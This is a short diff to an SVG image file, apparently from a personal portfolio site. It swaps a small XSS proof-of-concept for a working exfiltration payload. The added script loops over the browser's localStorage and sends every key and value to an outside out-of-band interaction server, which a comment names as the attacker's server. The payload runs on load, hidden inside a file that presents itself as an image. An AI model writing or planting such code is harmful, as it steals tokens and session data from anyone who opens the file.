@@ -1,6 +1,15 @@
-<?xml version="1.0" ?>
-<svg xmlns="http://www.w3.org/2000/svg">
-<circle></circle>
-<script type="text/javascript"><![CDATA[parent.window.postMessage("https://ya3raj.github.io/bhuwanportfolio/xss.svg", "*")]]>
-</script>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script type="application/ecmascript">
+    <![CDATA[
+      let data = '';
+      for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        let value = localStorage.getItem(key);
+        data += encodeURIComponent(key) + '=' + encodeURIComponent(value) + '&';
+      }
+      // Send the exfiltrated data to the attacker's server
+      fetch('https://cydlhjnpvjqqgvjwcfhorjxk718cwezae.oast.fun/?' + data);
+    ]]>
+  </script>
+  <rect x="10" y="10" width="80" height="80" fill="blue"/>
 </svg>
